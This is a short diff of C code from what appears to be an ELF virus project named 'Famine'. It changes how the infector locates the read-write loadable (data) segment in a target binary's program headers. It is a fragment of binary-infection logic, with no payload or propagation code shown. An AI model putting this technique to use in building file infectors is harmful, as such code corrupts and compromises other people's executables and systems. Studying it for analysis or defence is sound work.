@@ -5,20 +5,16 @@ int		modify_program_header(void *ptr, t_famine *info)
 	Elf64_Ehdr	*ehdr;
 	Elf64_Phdr	*phdr;
 	int			i;
-	int			filled;
 
 	ehdr = ptr;
 	phdr = ptr + ehdr->e_phoff;
 	if (!is_in_address(phdr) || !is_in_address(phdr + ehdr->e_phnum))
 		return (0);
 	i = -1;
-	filled = 0;
 	info->data = NULL;
 	while (++i < ehdr->e_phnum)
 	{
-		if (phdr->p_type == 1)
-			filled++;
-		if (phdr->p_type == 1 && filled == 2)
+		if (phdr->p_type == 1 && (phdr->p_flags & 0b111) == PF_W + PF_R)
 			info->data = phdr;
 		else if (info->data && phdr->p_offset > info->data->p_offset + info->data->p_filesz)
 		{
